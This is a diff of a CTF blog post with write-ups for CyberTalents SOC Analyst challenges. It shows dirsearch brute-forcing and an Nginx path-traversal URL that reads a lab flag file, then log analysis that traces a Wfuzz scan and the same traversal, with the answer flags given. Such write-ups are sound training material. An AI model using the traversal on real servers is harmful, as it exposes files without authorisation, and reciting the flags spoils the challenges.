@@ -2,22 +2,26 @@
 title: "CyberTalents Certified SOC Analyst Challenges"
 
 header:
-  teaser: /assets/images/CyberTalents/SOC_Analyst/photo_2023-07-08_18-06-43.jpg
-  overlay_image: /assets/images/CyberTalents/SOC_Analyst/photo_2023-07-08_18-06-43.jpg
+  teaser: /assets/images/CyberTalents/SOC_Analyst/SOC_Analyst.jpg
+  overlay_image: /assets/images/CyberTalents/SOC_Analyst/SOC_Analyst.jpg
   overlay_filter: 0.5
 
 ribbon: Green
 description: "CyberTalents Blue Team Scholarship 2023"
 categories:
-  - Challenges
-  - SOC
   - CyberTalents
-  - CTF
+  - Challenges
 tags: 
   - SOC
   - CyberTalents
   - Trend Micro
   - CTF
+  - CVE Number
+  - Smart Role
+  - Creepy DNS
+  - WormSeen
+  - Bean
+  - Beans Detector
 
 toc: true
 toc_sticky: true
@@ -154,6 +158,7 @@ Flag
 flag{internal:192.168.1.58:CVE-2011-2523:08:00:27:66:e3:8b}
 </details>
 ---
+
 # 5. Creepy DNS
 ### Description
 
@@ -281,6 +286,167 @@ flag{192.168.1.0/24:22:85}
 
 ---
 
+# 7. Bean
+
+### Description
+
+Come back home Mr. Bean.
+
+### Tools:
+
+- dirsearch
+
+### 🧑🏻‍💻 Lets Solve This..!
+
+First install the dirsearch tool for directory brute forcing by using this command:
+
+```python
+apt install dirsearch
+```
+
+Now lets open the URL in browser:
+
+| ![Bean](/assets/images/CyberTalents/SOC_Analyst/challenge/bean/1.png) | 
+|:--:|
+| *Come back home Mr. Bean.* |
+
+Second we use the dirsearch to scan the challenge url:
+
+```python
+dirsearch -u <URL>
+```
+
+Result:
+
+```python
+[13:14:29] Starting: 
+[13:15:27] 301 -  185B  - /files  ->  http://*********-web.cybertalentslabs.com/files/
+[13:15:28] 200 -    9KB - /files/
+[13:15:31] 200 -  404B  - /index.html
+```
+
+Lets try this directories in url:
+
+| ![Bean](/assets/images/CyberTalents/SOC_Analyst/challenge/bean/2.png) | 
+|:--:|
+| *Files* |
+
+From descrition line that tell us `Come back home Mr. Bean.`
+
+Now we try go to the home directory of  Mr. Bean and see the result using the url:
+
+```python
+http://*********-web.cybertalentslabs.com/files/../home/
+```
+
+| ![Bean](/assets/images/CyberTalents/SOC_Analyst/challenge/bean/3.png) | 
+|:--:|
+| *Files* |
+
+Woow! we find the flag.txt file lets open this file and summit the flag.
+
+<details>
+<summary>
+Flag
+</summary>
+FLAG{Nginx_nOt_aLWays_sEcUre_bY_The_waY}
+</details>
+
+---
+
+# 8. Beans Detector
+
+### Description
+
+You have received the alert in your company WAF that web attack happened recently. Please check and identify the below details
+
+Follow the below Format in order to submit the flag:
+- X: Attacker IP Address
+- Y: Name of vulnerability scanner used by the attacker
+- Z: number of bytes in the sensitive file leaked
+- W: Date and time of the successful attack (xx/xx/xxxx:xx:xx:xx)
+
+Flag Format: flag{X:Y:Z:W}
+
+### Tools:
+
+- cat & grep commands
+
+🚩Challenge [Link](https://hubchallenges.s3.eu-west-1.amazonaws.com/foren/beansdetectorlogs)
+
+### 🧑🏻‍💻 Lets Solve This..!
+
+Lets read the file content by using `cat` command and use my own filter on this file:
+
+- X: Attacker IP Address
+
+```python
+cat beansdetectorlogs | cut -d " " -f 1 | sort | uniq -c
+  41541 172.17.0.1
+```
+
+- Y: Name of vulnerability scanner used by the attacker
+
+```python
+cat beansdetectorlogs | grep " 200"
+172.17.0.1 - - [12/Jun/2022:11:04:06 +0000] "GET /index.html HTTP/1.1" 200 404 "-" "Wfuzz/2.2" "-"
+```
+
+- Z: number of bytes in the sensitive file leaked
+- W: Date and time of the successful attack (xx/xx/xxxx:xx:xx:xx)
+
+```python
+cat beansdetectorlogs | grep " 200"
+172.17.0.1 - - [12/Jun/2022:11:05:12 +0000] "GET /files../home/flag.txt HTTP/1.1" 200 49 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0" "-"
+```
+
+---
+
+Now concatenate all above answer to capture the flag..!
+
+
+<details>
+<summary>
+Flag
+</summary>
+flag{172.17.0.1:Wfuzz:49:12/06/2022:11:05:12}
+</details>
+
+---
+
+# 9. Pass reset
+
+### Description
+
+You have received the email below,  Please examine the email and answer the below questions
+
+### Tools:
+
+- 
+
+🚩Challenge [Link](https://hubchallenges.s3.eu-west-1.amazonaws.com/foren/passreset.msg.zip)
+
+### 🧑🏻‍💻 Lets Solve This..!
+
+
+---
+
+# 11. SIEM Port
+
+### Description
+
+Q. Your company planning to use Qradar as SIEM tool and you planning to receives logs from different different devices like routers, switches and some other devices, What Is The Default TLS Syslog Port That QRadar Listens On?
+
+
+<details>
+<summary>
+Flag
+</summary>
+
+</details>
+
+
+---
 
 
 ---
